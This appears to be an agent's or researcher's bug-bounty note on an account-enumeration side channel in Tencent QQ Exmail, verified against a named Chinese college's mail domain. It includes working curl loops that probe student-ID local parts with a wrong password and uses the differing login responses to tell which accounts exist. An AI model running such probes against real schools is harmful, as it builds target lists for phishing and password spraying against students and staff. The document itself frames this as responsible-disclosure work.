# CDP / QQ Exmail account-enumeration verification note (2026-05-22)

## Scope
Target: 成都职业技术学院 / `cdp.edu.cn` email surface.

This is a session-specific reference under the broader education SRC email-security workflow. It should not become a standalone narrow skill.

## Finding class
Tencent Enterprise Mail (`exmail.qq.com`) can leak account existence through differential login failure behavior when a school domain uses QQ Exmail MX records.

This is useful when:
- `dig +short MX target.edu.cn` returns `mxbiz1.qq.com` / `mxbiz2.qq.com`;
- the school likely uses predictable student/staff identifiers as email local parts;
- the SRC accepts account enumeration / authentication side-channel issues with stable proof.

## CDP verified evidence

Domain records:
```bash
dig +short MX cdp.edu.cn; dig +short TXT cdp.edu.cn
```
Observed:
```text
5 mxbiz1.qq.com.
10 mxbiz2.qq.com.
"v=spf1 include:spf.mail.qq.com ~all"
```

Login endpoint:
```text
https://exmail.qq.com/cgi-bin/login
```

Existing-account candidate:
```bash
curl -sk --connect-timeout 5 --max-time 10 'https://exmail.qq.com/cgi-bin/login' -H 'Content-Type: application/x-www-form-urlencoded' --data 'uin=20230001@cdp.edu.cn&pwd=WrongPass123456&domain=cdp.edu.cn&aliastype=other' -o /tmp/cdp_20230001.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n'; grep -oE 'verify=true&clientuin=[0-9]+' /tmp/cdp_20230001.html | head -1
```
Observed:
```text
HTTP=200 SIZE=9168
verify=true&clientuin=20230001
```

Control accounts:
```bash
for u in 20230002 20240001 20239999; do echo "===== $u@cdp.edu.cn"; curl -sk --connect-timeout 5 --max-time 10 'https://exmail.qq.com/cgi-bin/login' -H 'Content-Type: application/x-www-form-urlencoded' --data "uin=$u@cdp.edu.cn&pwd=WrongPass123456&domain=cdp.edu.cn&aliastype=other" -o /tmp/cdp_${u}.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n'; grep -oE 'verify=true&clientuin=[0-9]+|errtype=1|clientuin=[0-9]+' /tmp/cdp_${u}.html | head -2; done
```
Observed:
```text
20230002: HTTP=200 SIZE≈4400-4602, errtype=1, clientuin=20230002
20240001: HTTP=200 SIZE≈4594-4602, errtype=1, clientuin=20240001
20239999: HTTP=200 SIZE≈4409, errtype=1, clientuin=20239999
```

Stability check:
```bash
for u in 20230001 20230002 20240001 20190001; do for i in 1 2; do curl -sk --connect-timeout 5 --max-time 10 'https://exmail.qq.com/cgi-bin/login' -H 'Content-Type: application/x-www-form-urlencoded' --data "uin=$u@cdp.edu.cn&pwd=WrongPass123456&domain=cdp.edu.cn&aliastype=other" -o /tmp/cdp_${u}_${i}.html -w "$u run$i SIZE=%{size_download} "; if grep -q 'verify=true' /tmp/cdp_${u}_${i}.html; then echo VERIFY; else echo NORMAL; fi; done; done
```
Observed:
```text
20230001 run1 SIZE=9168 VERIFY
20230001 run2 SIZE=9168 VERIFY
20230002 run1 SIZE=4602 NORMAL
20230002 run2 SIZE=4594 NORMAL
20240001 run1 SIZE=4602 NORMAL
20240001 run2 SIZE=4602 NORMAL
20190001 run1 SIZE=4400 NORMAL
20190001 run2 SIZE=4594 NORMAL
```

## Interpretation

A response containing `verify=true&clientuin=<localpart>` plus a materially larger response body indicates the QQ Exmail flow treats the local part as an existing account and enters a verification branch. Control accounts only return the generic `errtype=1` branch.

For reporting, describe this as an authentication side-channel / account enumeration issue. Do not claim mailbox access or password reset unless separately proven.

## Report threshold

Submit only when all are true:
1. MX confirms QQ Exmail for the target domain.
2. At least one account candidate repeatedly returns a distinct branch such as `verify=true`.
3. Multiple control accounts return only normal login-failure behavior.
4. The proof uses a single arbitrary wrong password and does not attempt credential stuffing or real login.
5. The report explains impact as target-list generation for phishing/password spraying, not direct mailbox compromise.

## Screenshot guidance

- Screenshot 1: MX/TXT record proof.
- Screenshot 2: existing-account candidate command and `SIZE=... VERIFY` / `verify=true&clientuin=...` output.
- Screenshot 3: several control accounts with `NORMAL` / `errtype=1` and smaller body sizes.
- Screenshot 4: two-run stability check showing the differential behavior persists.

## Pitfalls

- QQ Exmail response body size can vary slightly for normal failures. Use branch markers (`verify=true` vs only `errtype=1`) plus repeated runs, not size alone.
- Do not enumerate broadly in the report evidence. A few low-impact control accounts are enough to prove the side-channel.
- This is usually medium risk. Do not inflate it to high unless it chains to reset bypass, valid token issuance, or mailbox/data access.
